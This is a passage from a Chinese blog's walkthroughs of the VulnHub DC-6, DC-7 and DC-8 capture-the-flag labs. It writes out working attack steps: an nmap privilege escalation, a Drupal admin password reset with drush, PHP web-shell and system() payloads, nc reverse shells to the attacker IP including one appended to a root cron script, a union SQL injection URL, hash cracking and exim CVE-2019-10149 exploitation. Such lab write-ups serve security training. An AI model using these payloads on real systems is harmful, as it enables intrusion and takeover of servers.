<p>注意哈，<code>jens</code>只有在<code>~</code>目录下才可以执行<code>echo</code>命令，不然是不可以的</p>
</blockquote>
<p><img src="/2022/08/29/vulnhub/image-20221011132114963.png" alt="image-20221011132114963"></p>
<figure class="highlight routeros"><table><tr><td class="code"><pre><span class="line">sudo nmap <span class="attribute">--script</span>=getshell</span><br></pre></td></tr></table></figure>

<p><img src="/2022/08/29/vulnhub/image-20221011132315607.png" alt="image-20221011132315607"></p>
<p>成功提权，然后我们查找<code>flag</code>【没输入回显有点小难受，但是不影响拿<code>flag</code>】</p>
<p><img src="/2022/08/29/vulnhub/image-20221011132507052.png" alt="image-20221011132507052"></p>
<blockquote>
<figure class="highlight tap"><table><tr><td class="code"><pre><span class="line">Yb        dP<span class="number"> 888888 </span>88    <span class="number"> 88 </span>        8888b.   dP&quot;Yb  88b<span class="number"> 88 </span>888888 d8b </span><br><span class="line"> Yb  db  dP  88__  <span class="number"> 88 </span>   <span class="number"> 88 </span>         8I  Yb dP   Yb 88Yb88 88__   Y8P </span><br><span class="line">  YbdPYbdP   88&quot;&quot;  <span class="number"> 88 </span> .o<span class="number"> 88 </span> .o      8I  dY Yb   dP<span class="number"> 88 </span>Y88 88&quot;&quot;   `&quot;&#x27; </span><br><span class="line">   YP  YP   <span class="number"> 888888 </span>88ood8 88ood8     8888Y&quot;   YbodP <span class="number"> 88 </span> Y8<span class="number"> 888888 </span>(8) </span><br></pre></td></tr></table></figure>

<p><code>Congratulations!!!</code></p>
<p><code>Hope you enjoyed DC-6.  Just wanted to send a big thanks out there to all those</code><br><code>who have provided feedback, and who have taken time to complete these little</code><br><code>challenges.</code></p>
<p><code>If you enjoyed this CTF, send me a tweet via @DCAU7.</code></p>
<p>意思是：<br>恭喜！！！</p>
<p>希望你喜欢 DC-6。只是想向所有这些人表示衷心的感谢<br>谁提供了反馈，谁花时间完成了这些小事<br>挑战。</p>
<p>如果你喜欢这个 CTF，请通过@DCAU7 给我发一条推文。</p>
</blockquote>
<p><strong>一个旗子找完，游戏结束</strong></p>
<hr>
<h1 id="七、DC-7-中级"><a href="#七、DC-7-中级" class="headerlink" title="七、DC-7[中级]"></a>七、DC-7[中级]</h1><p><strong>only one flag</strong></p>
<blockquote>
<p><code>hint：</code><br><code>While it&#39;s kind of a logical progression from an earlier DC release (I won&#39;t tell you which one), there are some new concepts involved, but you will need to figure those out for yourself. :-) If you need to resort to brute forcing or dictionary attacks, you probably won&#39;t succeed.</code></p>
<p><code>What you will need to do, is to think &quot;outside&quot; of the box.</code></p>
<p><code>Waaaaaay &quot;outside&quot; of the box. :-)</code></p>
<p>虽然这是较早的 DC 版本的一种合乎逻辑的进展（我不会告诉你是哪一个），但其中涉及到一些新概念，但你需要自己弄清楚这些。:-) 如果您需要使用暴力破解或字典攻击，您可能不会成功。</p>
<p>您需要做的是跳出框框思考。</p>
<p>Waaaaaay“在盒子外面”。:-)</p>
</blockquote>
<h2 id="信息收集-6"><a href="#信息收集-6" class="headerlink" title="信息收集"></a>信息收集</h2><p><code>nmap</code>扫描查看开放端口</p>
<p><img src="/2022/08/29/vulnhub/image-20221018195918528.png" alt="image-20221018195918528"></p>
<p>发现运行着<code>22</code>和<code>80</code>端口，<code>22</code>端口运行着<code>ssh</code></p>
<p>先看看框架和语言</p>
<p><img src="/2022/08/29/vulnhub/image-20221018194429569.png" alt="image-20221018194429569"></p>
<p><code>CMS</code>是<code>Drupal 8</code>，看来这是关键【好家伙，<code>DC1</code>重现】</p>
<p>再顺手扫一下</p>
<p><img src="/2022/08/29/vulnhub/image-20221018194353195.png" alt="image-20221018194353195"></p>
<p>看到有一个登录窗口页面</p>
<p><img src="/2022/08/29/vulnhub/image-20221018194531613.png" alt="image-20221018194531613"></p>
<p>那我们就先想办法怎么获得一个用户的账号密码</p>
<hr>
<h2 id="1-跳出框架"><a href="#1-跳出框架" class="headerlink" title="1.跳出框架"></a>1.跳出框架</h2><blockquote>
<p>这里我开始以为是思维的框架，结果是靶机的框架，我们需要用搜素工具，得到我们的信息，而不是死脑筋在靶机上苦苦找漏洞或者蛮用爆破</p>
<p>在实际的环境中，我们也是这样的，在网站之外获得网站的信息，这也是收集信息的一个重要的办法</p>
</blockquote>
<p><img src="/2022/08/29/vulnhub/image-20221018200526154.png" alt="image-20221018200526154"></p>
<p>在网站的最底下我们发现了</p>
<figure class="highlight aspectj"><table><tr><td class="code"><pre><span class="line"><span class="meta">@DC</span>7USER</span><br></pre></td></tr></table></figure>

<p>这应该是网站的搭建者，对于像这种小网站，一般可能是在一些平台，比如<code>github</code>上搭建、挂载的【比如我的博客】，所以在这些平台上，我们很有可能得到一些我们想要的敏感信息和文件</p>
<p>所以我们用<code>bing</code>查一下【国内搜索引擎很难搜到，谷歌要魔法，我写这<code>DC7</code>这几天不方便魔法，所以<code>bing</code>最好】</p>
<p>还真找到了</p>
<figure class="highlight awk"><table><tr><td class="code"><pre><span class="line">https:<span class="regexp">//gi</span>thub.com<span class="regexp">/Dc7User/</span>staffdb<span class="regexp">/blob/m</span>aster/config.php</span><br></pre></td></tr></table></figure>

<p><img src="/2022/08/29/vulnhub/image-20221018201258802.png" alt="image-20221018201258802"></p>
<figure class="highlight gherkin"><table><tr><td class="code"><pre><span class="line">|<span class="string"> &lt;?php </span>|<span class="string">                                                              </span>|</span><br><span class="line">|<span class="string"> ----- </span>|<span class="string"> ------------------------------------------------------------ </span>|</span><br><span class="line">|<span class="string">       </span>|<span class="string"> $servername = &quot;localhost&quot;;                                   </span>|</span><br><span class="line">|<span class="string">       </span>|<span class="string"> $username = &quot;dc7user&quot;;                                       </span>|</span><br><span class="line">|<span class="string">       </span>|<span class="string"> $password = &quot;MdR3xOgB7#dW&quot;;                                  </span>|</span><br><span class="line">|<span class="string">       </span>|<span class="string"> $dbname = &quot;Staff&quot;;                                           </span>|</span><br><span class="line">|<span class="string">       </span>|<span class="string"> $conn = mysqli_connect($servername, $username, $password, $dbname); </span>|</span><br><span class="line">|<span class="string">       </span>|<span class="string"> ?&gt;                                                           </span>|</span><br></pre></td></tr></table></figure>

<p>得到账号和密码，以及数据库的名字，看来我们确实跳出了框架</p>
<p>我们利用账号密码在我们之前的网站登录一下试试</p>
<blockquote>
<p>$username &#x3D; “<code>dc7user</code>“;<br>$password &#x3D; “<code>MdR3xOgB7#dW</code>“;  </p>
</blockquote>
<p><img src="/2022/08/29/vulnhub/image-20221018201801467.png" alt="image-20221018201801467"></p>
<p>结果报错，看来这个账号并不是在这个页面登录的</p>
<h2 id="2-ssh登录"><a href="#2-ssh登录" class="headerlink" title="2.ssh登录"></a>2.ssh登录</h2><p>我们根据之前得到的信息知道，<code>22</code>端口运行着<code>ssh</code>，我们用其登录试试</p>
<blockquote>
<p>$username &#x3D; “<code>dc7user</code>“;<br>$password &#x3D; “<code>MdR3xOgB7#dW</code>“;  </p>
</blockquote>
<p><img src="/2022/08/29/vulnhub/image-20221018202130724.png" alt="image-20221018202130724"></p>
<p>好家伙，果然是<code>ssh</code>的账号密码</p>
<p>我们来找找有没有什么有用的东西</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">ls</span></span><br></pre></td></tr></table></figure>

<p><img src="/2022/08/29/vulnhub/image-20221018202308173.png" alt="image-20221018202308173"></p>
<p>我们先打开<code>backups</code>文件夹</p>
<p><img src="/2022/08/29/vulnhub/image-20221018202658047.png" alt="image-20221018202658047"></p>
<p>发现是两个<code>.gpg</code>文件</p>
<blockquote>
<p><code>gpg</code>文件<br>就是一个加密文件</p>
</blockquote>
<p>而我们现在没有信息和密码，所以我们再看看另一个文件</p>
<blockquote>
<p>返回上级目录<br><code>cat mbox</code> </p>
</blockquote>
<p><img src="/2022/08/29/vulnhub/image-20221018203146128.png" alt="image-20221018203146128"></p>
<p>发现是<code>root</code>用户命令执行的记录</p>
<p>发现了</p>
<blockquote>
<p><code>Database dump saved to /home/dc7user/backups/website.sql</code><br>&#x2F;&#x2F;数据库信息存入website.sql文件<br>&#x2F;&#x2F;然后root执行了加密脚本加密数据库文件</p>
</blockquote>
<p><img src="/2022/08/29/vulnhub/image-20221018203403493.png" alt="image-20221018203403493"></p>
<h3 id="定时任务【cron（crond）】"><a href="#定时任务【cron（crond）】" class="headerlink" title="*定时任务【cron（crond）】"></a>*定时任务【cron（crond）】</h3><p>我们发现在<code>root</code>用户执行加密脚本之前有一个<code>Cron</code></p>
<blockquote>
<p><code>Cron</code>发现是定时任务，代表过一段时间就执行一次，以来更新数据库备份文件【<code>backups</code>】</p>
<p>这是个定时任务 用<code>root</code> 运行<code>/opt/scripts/backups.sh</code></p>
</blockquote>
<p><img src="/2022/08/29/vulnhub/image-20221018203434313.png" alt="image-20221018203434313"></p>
<h3 id="关键思路"><a href="#关键思路" class="headerlink" title="*关键思路"></a>*关键思路</h3><p>查看下权限什么的，发现<code>www-data</code>拥有执行和写的权限，我们当前权限没有写权限，看来没办法动手脚了。</p>
<p><img src="/2022/08/29/vulnhub/image-20221018234503615.png" alt="image-20221018234503615"></p>
<h3 id><a href="#" class="headerlink" title></a></h3><p>但是如果我们获得了<code>www-data</code>的<code>shell</code> 那就可以写点东西进去，然后依靠<strong>计划任务</strong>，用<code>root</code>去运行，然后反弹<code>shell</code>，那么我们可以获得了<code>root</code>权限的<code>shell</code>了。</p>
<h2 id="3-drush命令对drupal修改用户名和密码"><a href="#3-drush命令对drupal修改用户名和密码" class="headerlink" title="3.drush命令对drupal修改用户名和密码"></a>3.<code>drush</code>命令对<code>drupal</code>修改用户名和密码</h2><p>我们按路径查看该脚本内容</p>
<p><img src="/2022/08/29/vulnhub/image-20221018203742731.png" alt="image-20221018203742731"></p>
<p>我们发现果然是个加密数据库文件的脚本，但是我们仍然不知道密码</p>
<p>但是我们发现了数据库文件似乎被更改过</p>
<p>出现了一个新的命令</p>
<blockquote>
<p><code>drush</code><br>&#x2F;&#x2F;drush命令是在drupal框架中进行配置的命令，可以修改用户名和密码，<br>&#x2F;&#x2F;但是drush必须在drupal安装目录下进行，所以我们可以按脚本给的<br><code>cd /var/www/html/</code></p>
</blockquote>
<p><img src="/2022/08/29/vulnhub/image-20221018204531647.png" alt="image-20221018204531647"></p>
<blockquote>
<p><code>cd /var/www/html</code><br><code>drush user-password admin:123456</code><br>&#x2F;&#x2F;用户名<code>admin</code>和密码<code>123456</code></p>
</blockquote>
<p><img src="/2022/08/29/vulnhub/image-20221018205540723.png" alt="image-20221018205540723"></p>
<p>然后成功修改用户<code>admin</code>的密码为<code>123456</code></p>
<p><img src="/2022/08/29/vulnhub/image-20221018212431462.png" alt="image-20221018212431462"></p>
<h2 id="4-登录网站"><a href="#4-登录网站" class="headerlink" title="4.登录网站"></a>4.登录网站</h2><p>当我们输入我们修改后的密码后，成功登录<code>admin</code>用户</p>
<p><img src="/2022/08/29/vulnhub/image-20221018212905392.png" alt="image-20221018212905392"></p>
<p>然后我们统合一下思路，我们进入了网站后，应该如何拿到<code>shell</code>，那肯定需要写木马或者反弹<code>shell</code></p>
<p>那么我们就需要找到可以修改并增加<code>php</code>文件的的地方</p>
<p>我们先打开<code>content</code>页面，发现有<code>开始.html</code>页面</p>
<p><img src="/2022/08/29/vulnhub/image-20221018212952593.png" alt="image-20221018212952593"></p>
<p>点开查看</p>
<p><img src="/2022/08/29/vulnhub/image-20221018215114742.png" alt="image-20221018215114742"></p>
<p>发现可以修改内容，看来我们可以试试修改它，变成我们的木马文件</p>
<p>结果发现文件只能以<code>html</code>形式执行，而不能以<code>php</code>形式执行</p>
<p><img src="/2022/08/29/vulnhub/image-20221018215830844.png" alt="image-20221018215830844"></p>
<h3 id="添加php执行插件"><a href="#添加php执行插件" class="headerlink" title="添加php执行插件"></a>添加php执行插件</h3><p><code>drupal</code>框架可以添加<code>php</code>文件插件，从而能修改为<code>php</code>文件</p>
<p><img src="/2022/08/29/vulnhub/image-20221018220115382.png" alt="image-20221018220115382"></p>
<p>点击</p>
<figure class="highlight arduino"><table><tr><td class="code"><pre><span class="line">install <span class="keyword">new</span> <span class="keyword">module</span></span><br></pre></td></tr></table></figure>

<p><img src="/2022/08/29/vulnhub/image-20221018220912473.png" alt="image-20221018220912473"></p>
<p>在<code>url</code>里填写</p>
<figure class="highlight awk"><table><tr><td class="code"><pre><span class="line">https:<span class="regexp">//</span>ftp.drupal.org<span class="regexp">/files/</span>projects/php-<span class="number">8</span>.x-<span class="number">1</span>.x-dev.tar.gz</span><br></pre></td></tr></table></figure>

<p>然后<code>install</code></p>
<p><img src="/2022/08/29/vulnhub/image-20221018221952909.png" alt="image-20221018221952909"></p>
<p>但是我这里显示无法连接网站，那我们直接上传插件文件也是可以的</p>
<p><img src="/2022/08/29/vulnhub/image-20221018222047051.png" alt="image-20221018222047051"></p>
<p>然后添加成功</p>
<p><img src="/2022/08/29/vulnhub/image-20221018222109470.png" alt="image-20221018222109470"></p>
<p>然后在<code>FILTERS</code>处</p>
<p>启动插件【勾选】</p>
<p><img src="/2022/08/29/vulnhub/image-20221018222451086.png" alt="image-20221018222451086"></p>
<p>最后记得还要<code>install</code></p>
<p><img src="/2022/08/29/vulnhub/image-20221018222512620.png" alt="image-20221018222512620"></p>
<p>然后我们的文件就可以以<code>php</code>文件形式执行了</p>
<h3 id="加入一句话木马"><a href="#加入一句话木马" class="headerlink" title="加入一句话木马"></a>加入一句话木马</h3><p><img src="/2022/08/29/vulnhub/image-20221018232816262.png" alt="image-20221018232816262"></p>
<p>【记住<code>Text foromat</code>要改成<code>PHP code</code>】</p>
<p>然后保存即可</p>
<h2 id="5-蚁剑连接getshell"><a href="#5-蚁剑连接getshell" class="headerlink" title="5.蚁剑连接getshell"></a>5.蚁剑连接getshell</h2><p>因为我们是在<code>welcome</code>页面里插入一句话木马，所以直接连接靶机ip就行</p>
<figure class="highlight accesslog"><table><tr><td class="code"><pre><span class="line"><span class="number">192.168.133.146</span></span><br></pre></td></tr></table></figure>

<p><img src="/2022/08/29/vulnhub/image-20221018232842168.png" alt="image-20221018232842168"></p>
<p>连接成功</p>
<p>启动虚拟终端</p>
<p><img src="/2022/08/29/vulnhub/image-20221018232923762.png" alt="image-20221018232923762"></p>
<p><code>getshell</code></p>
<p><img src="/2022/08/29/vulnhub/image-20221018233020910.png" alt="image-20221018233020910"></p>
<h2 id="6-反弹shell拿www-data"><a href="#6-反弹shell拿www-data" class="headerlink" title="6.反弹shell拿www-data"></a>6.反弹shell拿www-data</h2><p>我们先开始监听<code>9999</code>端口</p>
<figure class="highlight apache"><table><tr><td class="code"><pre><span class="line"><span class="attribute">nc</span> -lvvp <span class="number">9999</span></span><br></pre></td></tr></table></figure>

<p><img src="/2022/08/29/vulnhub/image-20221018233321886.png" alt="image-20221018233321886"></p>
<p>我们在蚁剑的<code>shell</code>上</p>
<p>开始反弹<code>shell</code></p>
<figure class="highlight apache"><table><tr><td class="code"><pre><span class="line"><span class="attribute">nc</span> -e /bin/bash <span class="number">192.168.133.140</span> <span class="number">9999</span></span><br></pre></td></tr></table></figure>

<p><img src="/2022/08/29/vulnhub/image-20221018233814670.png" alt="image-20221018233814670"></p>
<p>然后拿到反弹<code>shell</code></p>
<p><img src="/2022/08/29/vulnhub/image-20221018233713840.png" alt="image-20221018233713840"></p>
<p>进入交互式shell</p>
<figure class="highlight llvm"><table><tr><td class="code"><pre><span class="line">python -<span class="keyword">c</span> <span class="string">&quot;import pty;pty.spawn(&#x27;/bin/bash&#x27;)&quot;</span></span><br></pre></td></tr></table></figure>

<p><img src="/2022/08/29/vulnhub/image-20221018234804275.png" alt="image-20221018234804275"></p>
<h2 id="7-利用定时任务【cron】提权root"><a href="#7-利用定时任务【cron】提权root" class="headerlink" title="7.利用定时任务【cron】提权root"></a>7.利用定时任务【cron】提权<code>root</code></h2><p>我们向 <code>backups.sh</code>写入反弹<code>shell</code>命令</p>
<figure class="highlight vim"><table><tr><td class="code"><pre><span class="line"><span class="keyword">echo</span> <span class="string">&quot;nc 192.168.133.140 12345 -e /bin/bash&quot;</span> &gt;&gt; /<span class="keyword">opt</span>/scripts/backups.<span class="keyword">sh</span></span><br></pre></td></tr></table></figure>

<p><img src="/2022/08/29/vulnhub/image-20221018235007598.png" alt="image-20221018235007598"></p>
<p>然后我们再开一个控制台开始监听<code>12345</code>端口</p>
<p><img src="/2022/08/29/vulnhub/image-20221018235124023.png" alt="image-20221018235124023"></p>
<p>然后我们等待定时任务执行，便可以拿到<code>shell</code>【时间有点久】</p>
<p><img src="/2022/08/29/vulnhub/image-20221019000112748.png" alt="image-20221019000112748"></p>
<p>连接成功后，到<code>root</code>目录查看<code>flag</code></p>
<p><img src="/2022/08/29/vulnhub/image-20221019123852041.png" alt="image-20221019123852041"></p>
<blockquote>
<figure class="highlight tap"><table><tr><td class="code"><pre><span class="line">888      <span class="number"> 888 </span>        <span class="number"> 888 </span>888      8888888b.                            <span class="number"> 888 </span>888<span class="number"> 888 </span>888 </span><br><span class="line">888   o  <span class="number"> 888 </span>        <span class="number"> 888 </span>888     <span class="number"> 888 </span> &quot;Y88b                           <span class="number"> 888 </span>888<span class="number"> 888 </span>888 </span><br><span class="line">888  d8b <span class="number"> 888 </span>        <span class="number"> 888 </span>888     <span class="number"> 888 </span>  <span class="number"> 888 </span>                          <span class="number"> 888 </span>888<span class="number"> 888 </span>888 </span><br><span class="line">888 d888b<span class="number"> 888 </span> .d88b. <span class="number"> 888 </span>888     <span class="number"> 888 </span>  <span class="number"> 888 </span> .d88b.  88888b.   .d88b. <span class="number"> 888 </span>888<span class="number"> 888 </span>888 </span><br><span class="line">888d88888b888 d8P  Y8b<span class="number"> 888 </span>888     <span class="number"> 888 </span>  <span class="number"> 888 </span>d88&quot;&quot;88b<span class="number"> 888 </span>&quot;88b d8P  Y8b<span class="number"> 888 </span>888<span class="number"> 888 </span>888 </span><br><span class="line">88888P Y88888<span class="number"> 88888888 </span>888<span class="number"> 888 </span>    <span class="number"> 888 </span>  <span class="number"> 888 </span>888 <span class="number"> 888 </span>888 <span class="number"> 888 </span>88888888 Y8P Y8P Y8P Y8P </span><br><span class="line">8888P   Y8888 Y8b.    <span class="number"> 888 </span>888     <span class="number"> 888 </span> .d88P Y88..88P<span class="number"> 888 </span><span class="number"> 888 </span>Y8b.      &quot;   &quot;   &quot;   &quot;  </span><br><span class="line">888P     Y888  &quot;Y8888 <span class="number"> 888 </span>888      8888888P&quot;   &quot;Y88P&quot; <span class="number"> 888 </span><span class="number"> 888 </span> &quot;Y8888 <span class="number"> 888 </span>888<span class="number"> 888 </span>888 </span><br></pre></td></tr></table></figure>


<p><code>Congratulations!!!</code></p>
<p><code>Hope you enjoyed DC-7.  Just wanted to send a big thanks out there to all those</code><br><code>who have provided feedback, and all those who have taken the time to complete these little</code><br><code>challenges.</code></p>
<p><code>I&#39;m sending out an especially big thanks to:</code></p>
<p><code>@4nqr34z</code><br><code>@D4mianWayne</code><br><code>@0xmzfr</code><br><code>@theart42</code></p>
<p><code>If you enjoyed this CTF, send me a tweet via @DCAU7.</code></p>
<p>意思是：<br>恭喜！！！</p>
<p>希望你喜欢 DC-7。只是想向所有这些人表示衷心的感谢<br>提供反馈的人，以及所有花时间完成这些小事的人<br>挑战。</p>
<p>我要特别感谢：</p>
<p>@4nqr34z<br>@D4mianWayne<br>@0xmzfr<br>@心42</p>
<p>如果你喜欢这个 CTF，请通过@DCAU7 给我发一条推文</p>
</blockquote>
<p><strong>一个旗子找完，游戏结束</strong></p>
<h1 id="八、DC8-初级"><a href="#八、DC8-初级" class="headerlink" title="八、DC8[初级]"></a>八、DC8[初级]</h1><p><strong>only one flag</strong></p>
<blockquote>
<p><code>hint:</code><br><code>This challenge is a bit of a hybrid between being an actual challenge, and being a &quot;proof of concept&quot; as to whether two-factor authentication installed and configured on Linux can prevent the Linux server from being exploited.</code></p>
<p><code>The &quot;proof of concept&quot; portion of this challenge eventuated as a result of a question being asked about two-factor authentication and Linux on Twitter, and also due to a suggestion by @theart42.</code></p>
<p><code>The ultimate goal of this challenge is to bypass two-factor authentication, get root and to read the one and only flag.</code></p>
<p><code>You probably wouldn&#39;t even know that two-factor authentication was installed and configured unless you attempt to login via SSH, but it&#39;s definitely there and doing it&#39;s job.</code></p>
<p>意思是：<br>这个挑战有点混合实际挑战和“概念证明”，即在 Linux 上安装和配置的双因素身份验证是否可以防止 Linux 服务器被利用。</p>
<p>这个挑战的“概念证明”部分最终是由于 Twitter 上关于双因素身份验证和 Linux 的问题，以及@theart42 的建议。</p>
<p>此挑战的最终目标是绕过双重身份验证，获取 root 权限并读取唯一标志。</p>
<p>除非您尝试通过 SSH 登录，否则您可能甚至不知道已安装和配置了双因素身份验证，但它肯定存在并且可以正常工作。</p>
</blockquote>
<h2 id="信息收集-7"><a href="#信息收集-7" class="headerlink" title="信息收集"></a>信息收集</h2><p> 先<code>nmap</code>扫一下</p>
<p><img src="/2022/08/29/vulnhub/image-20221102234939357.png" alt="image-20221102234939357"></p>
<blockquote>
<p>发现<br><code>22</code>端口<br>运行着<code>ssh</code></p>
<p>80端口下<br>发现有个<code>include</code>页面，可能需要在这里上传木马拿shell<br>然后有<code>install.mysql.txt</code>，看来可能需要用到数据库</p>
</blockquote>
<p>再<code>dirsearch</code>扫一下</p>
<p><img src="/2022/08/29/vulnhub/image-20221102235306844.png" alt="image-20221102235306844"></p>
<blockquote>
<p>发现有<code>/user/login</code>页面，猜测是登录后台的页面<br>后面找找有没有账号密码信息</p>
</blockquote>
<p>再看看<code>wapplzer</code></p>
<p><img src="/2022/08/29/vulnhub/image-20221103112318956.png" alt="image-20221103112318956"></p>
<h2 id="1-sql注入"><a href="#1-sql注入" class="headerlink" title="1.sql注入"></a>1.sql注入</h2><p>然后分析网站页面</p>
<p>发现在<code>details</code>时，<code>url</code>出现</p>
<figure class="highlight apache"><table><tr><td class="code"><pre><span class="line"><span class="attribute">http</span>://<span class="number">192.168.133.147</span>/?nid=<span class="number">1</span></span><br></pre></td></tr></table></figure>

<p><img src="/2022/08/29/vulnhub/image-20221103112255720.png" alt="image-20221103112255720"></p>
<p>看到注入处，再结合之前的<code>nmap</code>扫描的结果，有<code>mysql</code>安装，猜测可能存在<code>sql</code>注入</p>
<p>试试<code>sql</code>注入有没有反应</p>
<figure class="highlight accesslog"><table><tr><td class="code"><pre><span class="line"><span class="number">192.168.133.147</span>/?nid=-<span class="number">1</span> union select schema_name from information_schema.schemata--+</span><br></pre></td></tr></table></figure>

<p><img src="/2022/08/29/vulnhub/image-20221103130411912.png" alt="image-20221103130411912"></p>
<p>看来确实是存在<code>sql</code>注入</p>
<p>手动注不难，完全没有过滤，但还是用<code>sqlmap</code>直接梭哈</p>
<p>数据库知道了</p>
<p>先看看表</p>
<p><img src="/2022/08/29/vulnhub/image-20221103131256965.png" alt="image-20221103131256965"></p>
<p>看到有个<code>users</code>列，查看有没有我们需要的后台登录的账号密码</p>
<p>发现有两个用户</p>
<p><img src="/2022/08/29/vulnhub/image-20221103131824229.png" alt="image-20221103131824229"></p>
<figure class="highlight awk"><table><tr><td class="code"><pre><span class="line">admin <span class="variable">$S</span><span class="variable">$D2tRcYRyqVFNSc0NvYUrYeQbLQg5koMKtihYTIDC9QQqJi3ICg5z</span></span><br><span class="line">john <span class="variable">$S</span><span class="variable">$DqupvJbxVmqjr6cYePnx2A891ln7lsuku</span><span class="regexp">/3if/</span>oRVZJaz5mKC2vF</span><br></pre></td></tr></table></figure>

<p>但是密码是加密的，我们用<code>john</code>爆破一下</p>
<p>先把密码写入密码文本<code>pass.txt</code></p>
<p><img src="/2022/08/29/vulnhub/image-20221103133656691.png" alt="image-20221103133656691"></p>
<p><img src="/2022/08/29/vulnhub/image-20221103133745514.png" alt="image-20221103133745514"></p>
<p>然后就用<code>john</code>自带的密码本就行</p>
<figure class="highlight fortran"><table><tr><td class="code"><pre><span class="line">john <span class="keyword">pass</span>.txt</span><br></pre></td></tr></table></figure>

<p>但是再这里我用了<code>johny</code></p>
<p><img src="/2022/08/29/vulnhub/image-20221103134419589.png" alt="image-20221103134419589"></p>
<p>一个图形化的爆破工具</p>
<p>这里只得到<code>john</code>用户的密码</p>
<figure class="highlight ebnf"><table><tr><td class="code"><pre><span class="line"><span class="attribute">turtle</span></span><br></pre></td></tr></table></figure>

<h2 id="2-后台添加木马"><a href="#2-后台添加木马" class="headerlink" title="2.后台添加木马"></a>2.后台添加木马</h2><p>拿到账号密码后，我们到后台登录页面进行登录</p>
<figure class="highlight awk"><table><tr><td class="code"><pre><span class="line">http:<span class="regexp">//</span><span class="number">192.168</span>.<span class="number">133.147</span><span class="regexp">/user/</span>login</span><br></pre></td></tr></table></figure>

<p><img src="/2022/08/29/vulnhub/image-20221103134815814.png" alt="image-20221103134815814"></p>
<p>登录成功，根据之前我们信息收集，在<code>nmap</code>得到的信息，我们需要找到上传木马或者修改文件内容的地方</p>
<p>在右上角我们看到有个<code>content</code></p>
<p>打开看看里面是不是可以修改</p>
<p><img src="/2022/08/29/vulnhub/image-20221103135017243.png" alt="image-20221103135017243"></p>
<p>结果发现<code>Contact Us</code>页面文件可以进行修改</p>
<p>打开看看，发现在<code>edit</code>没有修改的地方</p>
<p><img src="/2022/08/29/vulnhub/image-20221103142531482.png" alt="image-20221103142531482"></p>
<p>于是找了找网站源码在</p>
<p><img src="/2022/08/29/vulnhub/image-20221103143057684.png" alt="image-20221103143057684"></p>
<p>这里可以修改，于是我们就修改一下</p>
<p>并记得把编码文件格式改为<code>PHP code</code></p>
<figure class="highlight php-template"><table><tr><td class="code"><pre><span class="line"><span class="language-xml"><span class="tag">&lt;<span class="name">p</span>&gt;</span>Thanks for taking the time to contact us. We shall be in contact soon.<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span></span><br><span class="line"><span class="language-xml"></span><span class="language-php"><span class="meta">&lt;?php</span></span></span><br><span class="line"><span class="language-php"><span class="title function_ invoke__">system</span>(<span class="string">&quot;nc -e /bin/sh 192.168.133.140 8888&quot;</span>);</span></span><br><span class="line"><span class="language-php"><span class="meta">?&gt;</span></span></span><br></pre></td></tr></table></figure>

<p><img src="/2022/08/29/vulnhub/image-20221103143148817.png" alt="image-20221103143148817"></p>
<p><img src="/2022/08/29/vulnhub/image-20221103144244656.png" alt="image-20221103144244656">然后底下保存</p>
<h2 id="3-反弹shell"><a href="#3-反弹shell" class="headerlink" title="3.反弹shell"></a>3.反弹shell</h2><p>然后我们开始监听</p>
<figure class="highlight apache"><table><tr><td class="code"><pre><span class="line"><span class="attribute">nc</span> -lvnp <span class="number">8888</span></span><br></pre></td></tr></table></figure>

<p><img src="/2022/08/29/vulnhub/image-20221103145521745.png" alt="image-20221103145521745"></p>
<p>访问<code>Contact Us</code>页面发送信息，从而触发php执行命令</p>
<p><img src="/2022/08/29/vulnhub/image-20221103145747096.png" alt="image-20221103145747096"></p>
<p>拿到<code>shell</code></p>
<p><img src="/2022/08/29/vulnhub/image-20221103145811789.png" alt="image-20221103145811789"></p>
<h2 id="4-提权【exim4】"><a href="#4-提权【exim4】" class="headerlink" title="4.提权【exim4】"></a>4.提权【exim4】</h2><p>先进入交互式<code>shell</code></p>
<figure class="highlight ada"><table><tr><td class="code"><pre><span class="line">python -c <span class="symbol">&#x27;import</span> pty; pty.spawn(<span class="string">&quot;/bin/bash&quot;</span>)&#x27;</span><br></pre></td></tr></table></figure>

<p><img src="/2022/08/29/vulnhub/image-20221103145952120.png" alt="image-20221103145952120"></p>
<p>先查看一下<code>suid</code>命令</p>
<figure class="highlight routeros"><table><tr><td class="code"><pre><span class="line"><span class="built_in">find</span> / -perm <span class="attribute">-u</span>=s -type f 2&gt;/dev/<span class="literal">null</span></span><br></pre></td></tr></table></figure>

<p><img src="/2022/08/29/vulnhub/image-20221103150054750.png" alt="image-20221103150054750"></p>
<p>找到了个新的命令<code>exim4</code>，搜了一下</p>
<blockquote>
<p><code>exim4</code></p>
<p><code>exim</code>远程命令执行漏洞分析（<code>cve-2019-10149</code>）</p>
<p>在对Exim邮件服务器最新改动进行代码审计过程中，我们发现4.87到4.91版本之间的Exim存在一个远程命令执行（RCE）漏洞。这里RCE指的是远程命令执行（Remote Command Execution），而不是远程代码执行（Remote Code Execution）：<code>攻击者可以以root权限使用execv()来执行任意命令，利用过程中不涉及到内存破坏或者ROP（Return-Oriented Programming）相关内容。</code></p>
<p>这个漏洞可以由本地攻击者直接利用（远程攻击者需要在特定的非默认配置下利用）。为了在默认配置下远程利用该漏洞，攻击者需要与存在漏洞的服务器建连7天（可以每隔几分钟发送1个字节）。然而由于Exim的代码非常复杂，我们无法保证这里介绍的方法是唯一的利用方法，可能还存在其他更加快捷的方法。</p>
<p>从4.87版开始（2016年4月6日公布），由于#ifdef EXPERIMENTAL_EVENT改成了#ifndef DISABLE_EVENT，因此Exim默认情况下就存在漏洞。在之前的版本中，如果手动启用了EXPERIMENTAL_EVENT选项，那么服务器也会存在漏洞。令人惊讶的是，这个漏洞已经在4.92版中被修复（2019年2月10日）：</p>
</blockquote>
<p>根据文档，发现是个和邮件服务有关的命令，并且存在命令执行漏洞</p>
<p>我们先查看一下其版本是否在这个<code>nday</code>的范围里</p>
<p><img src="/2022/08/29/vulnhub/image-20221103150517673.png" alt="image-20221103150517673"></p>
<p>发现刚好是这个版本范围，是存在<code>RCE</code></p>
<p>查看一下有没有利用的脚本</p>
<p><img src="/2022/08/29/vulnhub/image-20221103151738985.png" alt="image-20221103151738985"></p>
<figure class="highlight"><table><tr><td class="code"><pre><span class="line">Privilege：特权</span><br></pre></td></tr></table></figure>

<p>选择<code>46996.sh</code>，我们查看一下脚本文件内容</p>
